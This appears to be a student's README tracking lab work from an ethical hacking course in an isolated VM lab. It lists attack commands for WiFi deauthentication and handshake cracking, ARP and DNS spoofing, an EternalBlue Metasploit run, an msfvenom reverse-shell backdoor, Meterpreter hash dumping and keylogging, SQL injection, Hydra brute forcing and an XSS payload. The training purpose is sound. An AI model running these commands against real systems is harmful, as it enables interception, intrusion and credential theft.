# 🛡️ Practical Ethical Hacking — Lab & Progress Tracker

## 📌 Project Overview
This repository serves as a comprehensive, structured record of my hands-on experience and practical lab work in ethical hacking and penetration testing. It documents my journey from setting up secure, isolated virtual environments to executing advanced, real-world cyber attacks. Through these exercises, I have developed a strong foundation in network analysis, vulnerability assessment, and offensive security techniques.

**Current Objectives:** 
- Complete extensive practical lab scenarios.
- Attain industry-standard certifications (eJPT, CEH, OSCP).
- Continuously build and refine penetration testing skills.

---

## 🎯 Skills Demonstrated
- **Network Analysis & Wireless Security**: Sniffing, WPA/WPA2 cracking, Deauthentication attacks, monitor mode configurations.
- **Man-in-the-Middle (MITM) Attacks**: ARP Spoofing, DNS Spoofing, HTTPS downgrades, and extracting cleartext credentials.
- **Vulnerability Exploitation**: Scanning with Nmap/Metasploit, exploiting vulnerable services (e.g., EternalBlue), and bypassing security mechanisms.
- **Post-Exploitation Tactics**: Privilege escalation, payload generation (MSFvenom), keylogging, maintaining persistence, and hash dumping.
- **Web Application Penetration Testing**: SQL Injection (SQLi), Cross-Site Scripting (XSS), Local File Inclusion (LFI), and brute-forcing logins.

---

## 🛠️ Lab Environment Setup
To ensure safety and legal compliance, all attacks are conducted in a strictly isolated local laboratory environment.

- **Attacker Machine:** Kali Linux VM
- **Target Machine(s):** Windows VM / Metasploitable
- **Network Architecture:** Unified NAT Network (ensuring all VMs possess visibility while remaining isolated from the host/external network).

---

## 📈 Learning Progress Tracker

| Module | Status | Completion Date |
|:---|:---:|:---:|
| **1. Setup & Fundamentals** | ⬜ Not Started | - |
| **2. Network Hacking (Pre-Connection)** | ⬜ Not Started | - |
| **3. Network Hacking (Post-Connection)** | 🔄 In Progress | 27-03-2025 |
| **4. Man-in-the-Middle Attacks** | 🔄 In Progress | 27-03-2025 |
| **5. Gaining Access (System Hacking)** | ⬜ Not Started | - |
| **6. Post Exploitation** | ⬜ Not Started | - |
| **7. Web Application Hacking** | ⬜ Not Started | - |

> **Legend:** ✅ Completed &nbsp;&nbsp;\|&nbsp;&nbsp; 🔄 In Progress &nbsp;&nbsp;\|&nbsp;&nbsp; ⬜ Not Started &nbsp;&nbsp;\|&nbsp;&nbsp; ❌ Troubleshooting Needs

---

## 💻 Section 1: Setup & Basics

**Objective:** Establish and verify an isolated penetration testing environment.

- [ ] Install VirtualBox / VMware hypervisor.
- [ ] Deploy Kali Linux VM (Attacker).
- [ ] Deploy Windows VM (Target).
- [ ] Configure Virtual NAT Network routing.
- [ ] Verify inter-VM connectivity via ICMP requests (`ping`).
- [ ] Solidify understanding of IP vs. MAC addressing operations.

### 🧪 Lab Results Log
| Field | Value |
|---|---|
| **Kali IP** | *Pending* |
| **Windows VM IP** | *Pending* |
| **Router IP** | *Pending* |
| **Status** | ⬜ |

---

## 📡 Section 2: Network Hacking — Pre-Connection Attacks

**Objective:** Audit local wireless networks and execute attacks without establishing authentication.

- [ ] Engage Monitor Mode on physical WiFi adapters.
- [ ] Perform packet sniffing and target identification with `airodump-ng`.
- [ ] Disconnect associated clients via Deauthentication attacks.
- [ ] WEP Cracking.
- [ ] Intercept WPA/WPA2 cryptographic handshakes.
- [ ] Execute localized dictionary attacks on WPA/WPA2 captures.
- [ ] Launch Evil Twin / Fake Access Point infrastructure.

### 🔑 Critical Commands
```bash
# Enable monitor mode on interface
sudo airmon-ng start wlan0

# Broad network reconnaissance
sudo airodump-ng wlan0mon

# Directed traffic capture on a specific BSSID
sudo airodump-ng --bssid <BSSID> -c <channel> -w capture wlan0mon

# Forced deauthentication attack
sudo aireplay-ng --deauth 100 -a <ROUTER-MAC> -c <CLIENT-MAC> wlan0mon

# Dictionary attack against captured WPA handshake
sudo aircrack-ng capture.cap -w /usr/share/wordlists/rockyou.txt
```

### 🧪 Lab Results Log
| Target Network | Attack Vector | Result | Issues Identified & Mitigations |
|---|---|:---:|---|
| *Domain* | *Deauth* | ⬜ | *N/A* |

---

## 🔀 Section 3: Network Hacking — Post-Connection Attacks

**Objective:** Exploit layer 2 vulnerabilities to manipulate traffic flows from within an authenticated network edge.

- [ ] Enumerate internal network devices via `netdiscover` and `arp-scan`.
- [ ] Perform comprehensive ARP Spoofing/Poisoning against target endpoints.
- [ ] Analyze intercepted PCAP structures securely via Wireshark.
- [ ] Extract cleartext authentication (HTTP) data from streams.
- [ ] Intercept and falsify DNS resolution entries (DNS Spoofing).
- [ ] Implement robust MITM frameworks leveraging `bettercap`.

### 🔑 Critical Commands
```bash
# Network device enumeration
sudo arp-scan --localnet
sudo netdiscover -i eth0

# Enable IP forwarding to prevent denial of service during MITM
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Bidirectional ARP Spoofing (Run in separate terminal sessions)
sudo arpspoof -i eth0 -t <VICTIM-IP> <ROUTER-IP>   # Poison Target
sudo arpspoof -i eth0 -t <ROUTER-IP> <VICTIM-IP>   # Poison Router

# Cleartext HTTP Sniffing
sudo urlsnarf -i eth0
sudo driftnet -i eth0

# DNS Spoofing via Ettercap (requires pre-configured dns_spoof.conf)
sudo ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /<VICTIM-IP>// /<ROUTER-IP>//
```

### 🧪 Lab Results Log — ARP Spoofing Incident (27-03-2025)
| Objective Checklist | Status | Note |
|---|:---:|---|
| Enable IP Forwarding | ✅ | Critical to prevent dropping packets. |
| Poison Victim ARP Cache | ✅ | Validated via `arp -a` on Windows Target. |
| Poison Router ARP Cache | ✅ | Successfully mirrored traffic. |
| Traffic Captured Successfully | ✅ | Able to observe clear HTTP requests. |

---

## 🎭 Section 4: Man-in-the-Middle (MITM) Deep Dive

**Objective:** Advanced analysis, traffic mutation, and stealth tactics during interception phases.

- [ ] Execute modular MITM routing through `bettercap`.
- [ ] Create specialized Wireshark filtering parameters for credential extraction.
- [ ] Implement `sslstrip` techniques to forcibly downgrade HTTPS to HTTP.
- [ ] Execute arbitrary JavaScript injection into transmitted standard HTTP responses.

### 🔑 Critical Commands
```bash
# Advanced Wireshark syntax for rapid triage
http                        # Filter all standard web traffic
http.request.method == POST # Restrict to submission endpoints (likely credentials)
http contains "password"    # Explicit string matching
dns                         # Review queried domains

# Bettercap configuration baseline
sudo bettercap -iface eth0

# Bettercap interactive session flow
> net.probe on
> net.show
> set arp.spoof.targets <VICTIM-IP>
> arp.spoof on
> net.sniff on
```

---

## 💻 Section 5: Gaining Access (System Hacking)

**Objective:** Discover, validate, and successfully exploit deterministic vulnerabilities in server protocols and client applications.

- [ ] Reconnaissance via Metasploit (`db_nmap`) database integrations.
- [ ] Exploit vulnerable SMB endpoints (e.g., MS17-010 EternalBlue).
- [ ] Package malicious `.exe` payloads using `msfvenom` and encoders.
- [ ] Deploy multi-handler environments to capture reverse shells.
- [ ] Initiate preliminary client-side attack mapping.

### 🔑 Critical Commands
```bash
# Launch Metasploit Framework Console
sudo msfconsole

# Search, Configure, and Launch an Exploit Sequence
msf> search eternalblue
msf> use exploit/windows/smb/ms17_010_eternalblue
msf> set RHOSTS <TARGET-IP>
msf> set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf> set LHOST <KALI-IP>
msf> run

# Generating Custom Reverse TCP Payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<KALI-IP> LPORT=4444 -f exe > backdoor.exe
```

---

## 🕵️ Section 6: Post Exploitation

**Objective:** Establish persistence, escalate privileges, and seamlessly extract data post-compromise.

- [ ] Command and control via Meterpreter architecture.
- [ ] Bypass logical filesystem boundaries via privilege escalation.
- [ ] Dump local SAM/LSASS hashes for offline cracking operations.
- [ ] Implement logical keyloggers and interface monitoring.
- [ ] Solidify persistence mechanisms via registry mutations.
- [ ] Document internal layout for potential network pivoting actions.

### 🔑 Critical Commands
```bash
# Standard Meterpreter Post-Exploitation Commands
meterpreter> sysinfo          # Evaluate host baseline
meterpreter> getuid           # Determine current privilege level
meterpreter> hashdump         # Extract encrypted credentials
meterpreter> screenshot       # Visual validation of active session
meterpreter> keyscan_start    # Deploy stealth keylogger
meterpreter> keyscan_dump     # Harvest logged keystrokes
meterpreter> run persistence  # Ensure survival across reboots
meterpreter> shell            # Spawn native OS shell environment
```

---

## 🌐 Section 7: Web Application Hacking

**Objective:** Identify, exploit, and document security flaws in the presentation and database layers of modern web applications.

- [ ] Uncover input sanitization failures leading to SQL Injection (SQLi).
- [ ] Automate enumeration and data extraction with `sqlmap`.
- [ ] Discover and exploit Reflected and Stored Cross-Site Scripting (XSS).
- [ ] Achieve remote code execution via unsafe File Upload functionalities.
- [ ] Perform directory traversal via Local File Inclusion (LFI).
- [ ] Execute targeted, parameter-based brute force strategies utilizing Hydra.

### 🔑 Critical Commands
```bash
# SQL Injection Logic Tests
' OR '1'='1
' OR 1=1--
admin'--

# SQLmap Database Enumeration
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D dbname --tables

# Automated Form-Based Brute Forcing with Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET-IP> http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# Basic XSS Validation Payload
<script>alert('XSS Exploit Successful')</script>
```

---

## 🧰 The Penetration Tester's Toolkit
A quick reference to the principal tools utilized across all lab scenarios:

| Tool | Primary Purpose | Deployment Method |
|:---|:---|:---|
| **`nmap`** | Port and service surface mapping | Pre-installed (Kali) |
| **`msfconsole`** | Enterprise-grade exploitation framework | Pre-installed (Kali) |
| **`msfvenom`** | Malicious payload structuring | Pre-installed (Kali) |
| **`airodump-ng` / `aircrack-ng`**| Wireless capture and cryptographic cracking | Pre-installed (Kali) |
| **`arpspoof`** | Layer 2 redirection and poisoning | `sudo apt install dsniff` |
| **`bettercap`** | Next-gen automated MITM orchestration | `sudo apt install bettercap` |
| **`wireshark`** | Granular deep packet inspection | Pre-installed (Kali) |
| **`sqlmap`** | Automated database exploitation | Pre-installed (Kali) |
| **`hydra`** | Protocol-agnostic network logon cracker | Pre-installed (Kali) |

---

## ⚠️ Key Learnings & Issue Log

Real-world hacking involves as much debugging as it does executing attacks. Below is a log of critical technical hurdles encountered in the lab and how they were overcome:

**1. ARP Spoofing Failure — Traffic Dropping**
- **Symptom:** Generating ARP spoof traffic successfully modified the MAC addresses on the victim cache, but the target completely lost internet connectivity rather than passing traffic through the attacker.
- **Root Cause & Fix:** IP Forwarding was disabled by default in the Linux kernel on the Kali machine.
- **Solution:** Addressed immediately by mutating `/proc/sys/net/ipv4/ip_forward` to a state of `1` (`echo 1 > /proc/sys/net/ipv4/ip_forward`). 

**2. Attack Isolation Misconfiguration**
- **Symptom:** Early ARP and network discovery attempts failed to reach the Windows Target VM.
- **Root Cause & Fix:** The virtualized adapter was operating in standard standard 'NAT' rather than a 'NAT Network', isolating each VM dynamically.
- **Solution:** Re-configured the hypervisor to bind both Attacker and Target to the same custom `NAT Network` subsystem.

---

## 📚 External Resources & Accreditations

- 🎓 **Origin Course:** [Zaid's Learn Ethical Hacking from Scratch (Udemy)](https://www.udemy.com/course/learn-ethical-hacking-from-scratch/)
- 🏋️ **Active Practice:** [TryHackMe - Jr Penetration Tester Path](https://tryhackme.com/path/outline/jrpenetrationtester)
- 🏋️ **Advanced Practice:** [HackTheBox](https://www.hackthebox.com/)
- 📖 **Methodology Checklists:** [HackTricks Platform](https://book.hacktricks.xyz/)

<div align="center">
  <sub>🛡️ Remember: Always act with permission. Hack legally. Hack ethically.</sub>
</div>
